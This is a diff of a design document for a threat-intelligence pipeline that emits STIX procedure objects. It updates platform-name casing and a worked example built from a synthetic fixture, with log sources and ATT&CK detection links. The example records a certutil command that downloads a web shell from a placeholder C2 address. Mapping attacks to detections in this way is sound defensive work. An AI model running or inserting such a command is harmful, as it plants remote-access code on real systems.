@@ -126,7 +126,7 @@ nothing else may appear on the object. `required` is the STIX envelope plus
 | `name` | string | drafting | `[Verb] [Object] via [Tool/Method]`; no actor names; §5 |
 | `description` | string | drafting | Objective sentence first, then mechanism, then what a defender observes |
 | `x_procedure_type` | string, open vocabulary | drafting | `reporting` (from a source's account) or `hypothetical` (the source speculates); the schema also suggests `observed` for internal incident data, which this pipeline never emits |
-| `x_platforms` | string[], open vocabulary | drafting | This pipeline uses the OpenTide threat-surface vocabulary (`windows::server`, `container runtime::docker`); the schema suggests ATT&CK's platform names and permits either |
+| `x_platforms` | string[], open vocabulary | drafting | This pipeline uses the OpenTide threat-surface vocabulary (`Windows::Server`, `Container Runtime::Docker`); the schema suggests ATT&CK's platform names and permits either |
 | `kill_chain_phases` | kill-chain-phase[] | serializer | `mitre-attack` phases derived from the techniques' tactics unless the draft carries its own |
 | `confidence` | integer 0–100 | normalizer | The blend in §6 |
 | `first_observed`, `last_observed` | date-time | drafting | Only when the source gives a date |
@@ -455,41 +455,54 @@ Stated so nobody rediscovers them.
 
 ## 14. A complete example
 
-Real serializer output from the synthetic three-draft fixture in
-`tests/conftest.py`, so the example contains no vendor material. The
-`attack-pattern` targets are external references, resolved against the
-catalogue but not embedded in this small bundle. This procedure has a
-component because the fixture supplies a command line; it has no
-`precedes` edge because the fixture carries no chunk graph.
+Real serializer output, rendered by
+`backend/scripts/render_procedure_example.py` from the synthetic three-draft
+fixture in `tests/conftest.py` against the local ATT&CK catalogue, so the
+example contains no vendor material. The `attack-pattern` targets are the
+catalogue's own ids for T1059.003 and T1105; the serializer embeds a stub for
+each, with the detection strategies, analytics and data components that
+detect them, so the bundle stands alone. This procedure has a component
+because the fixture supplies a command line; it has no `precedes` edge
+because the fixture carries no chunk graph. Re-run the script to regenerate
+it: ids and timestamps change, nothing else should.
 
 ```json
 {
   "type": "x-procedure",
   "spec_version": "2.1",
-  "id": "x-procedure--5e04f60d-2ebe-4d3d-a5f4-2d1fff629516",
-  "created": "2026-09-12T15:23:34.386Z",
-  "modified": "2026-09-12T15:23:34.386Z",
+  "id": "x-procedure--df68971c-f0a5-41e3-8701-da6b2dfa3b7b",
+  "created": "2026-09-19T02:14:39.120Z",
+  "modified": "2026-09-19T02:14:39.120Z",
   "name": "Download web shell via certutil",
   "description": "The actor used certutil.exe to download a web shell from the C2 server.",
-  "created_by_ref": "identity--9f6a692e-95f9-4c5d-9815-f850e4ae19bc",
+  "created_by_ref": "identity--9f0c304b-71c8-452a-a38d-bc3e472a0aa7",
   "extensions": {
     "extension-definition--b422519e-c47a-439d-9195-0f16b94fa889": { "extension_type": "new-sdo" }
   },
   "x_technique_refs": [
-    "attack-pattern--8d267313-c6e0-4b7b-811e-f96930c889ec",
-    "attack-pattern--66f5262d-8372-4b9a-8f2c-435dddf23161"
+    "attack-pattern--d1fcf083-a721-4223-aedf-bf8960798d62",
+    "attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add"
   ],
   "kill_chain_phases": [
     { "kill_chain_name": "mitre-attack", "phase_name": "execution" },
     { "kill_chain_name": "mitre-attack", "phase_name": "command-and-control" }
   ],
-  "x_platforms": ["windows::server"],
+  "x_platforms": ["Windows::Server"],
   "confidence": 78,
-  "x_source_refs": ["identity--9f6a692e-95f9-4c5d-9815-f850e4ae19bc"],
+  "x_source_refs": ["identity--9f0c304b-71c8-452a-a38d-bc3e472a0aa7"],
   "x_procedure_type": "reporting",
   "x_source_provenance": "paraphrased",
-  "x_fingerprint": "f152cefe0cd06a3a5e9c4770a5ada269",
-  "x_components_refs": ["process--14cb5655-000c-409d-96e0-ba75c72fea54"]
+  "x_fingerprint": "6bfba316fbde6dfbf96c929160c98060",
+  "x_components_refs": ["process--c6841fd5-6213-4d26-accd-22e7eec2deec"],
+  "x_log_source_refs": [
+    "x-log-source--0bf9f575-b2fd-4d8b-82cb-b436729a1488",
+    "x-log-source--2e0e85e0-3953-4b6b-b1cf-72bdd050bdff",
+    "x-log-source--335659bd-bff4-45ec-8b29-f559af123b2a",
+    "x-log-source--5a65bd16-db13-4904-8081-242d7d1247f1",
+    "x-log-source--844aa3eb-3027-4c26-b2ab-c07f24977cce",
+    "x-log-source--9278ebe5-ec9a-431f-a534-ac9230328b48",
+    "x-log-source--b69216d6-6088-413e-947b-6e634fa0ed47"
+  ]
 }
 ```
 
@@ -501,19 +514,53 @@ otherwise `image_ref` points at that file.
 {
   "type": "process",
   "spec_version": "2.1",
-  "id": "process--14cb5655-000c-409d-96e0-ba75c72fea54",
+  "id": "process--c6841fd5-6213-4d26-accd-22e7eec2deec",
   "command_line": "certutil.exe -urlcache -split -f http://203.0.113.10/shell.jsp",
   "x_exe_name": "certutil.exe"
 }
 ```
 
+Its log sources: the ATT&CK data components reached from the procedure's two
+techniques through detection strategy → analytic → data component. Each is
+emitted once per bundle and referenced by every procedure it detects. One in
+full, the description verbatim from the data component:
+
+```json
+{
+  "type": "x-log-source",
+  "spec_version": "2.1",
+  "id": "x-log-source--335659bd-bff4-45ec-8b29-f559af123b2a",
+  "created": "2026-09-19T02:14:39.171Z",
+  "modified": "2026-09-19T02:14:39.171Z",
+  "name": "Script Execution",
+  "description": "The execution of a text file that contains code via the interpreter.",
+  "x_mitre_data_component_ref": "x-mitre-data-component--9f387817-df83-432a-b56b-a8fb7f71eedd"
+}
+```
+
+The other six, with the technique each one came in through:
+
+```
+x-log-source--0bf9f575-…   File Creation                (T1105)
+x-log-source--2e0e85e0-…   Network Connection Creation  (T1105)
+x-log-source--5a65bd16-…   Process Creation             (T1059.003, T1105)
+x-log-source--844aa3eb-…   Module Load                  (T1059.003)
+x-log-source--9278ebe5-…   Command Execution            (T1105)
+x-log-source--b69216d6-…   Network Traffic Flow         (T1105)
+```
+
 The relationships that name it, in the same bundle:
 
 ```
-uses   x-procedure--5e04f60d…  ->  attack-pattern--8d267313…   (T1059.003, external)
-uses   x-procedure--5e04f60d…  ->  attack-pattern--66f526…     (T1105, external)
-uses   intrusion-set--228048f… ->  x-procedure--5e04f60d…      (the fixture's actor)
+uses   x-procedure--df68971c-…  ->  attack-pattern--d1fcf083-…   (T1059.003)
+uses   x-procedure--df68971c-…  ->  attack-pattern--e6919abc-…   (T1105)
+uses   intrusion-set--da608f09-… ->  x-procedure--df68971c-…      (the fixture's actor)
 ```
+
+Behind those sits the detection chain the log sources were projected from.
+For this bundle's 4 techniques that is 4 `x-mitre-detection-strategy`,
+14 `x-mitre-analytic` and 10 `x-mitre-data-component` stubs, tied together by
+4 `detects`, 14 `has-analytic` and 39 `uses-data-component` relationships.
 
 The extension definition the procedure declares, and its author, embedded
 once in every bundle that contains a procedure. Both carry fixed timestamps:
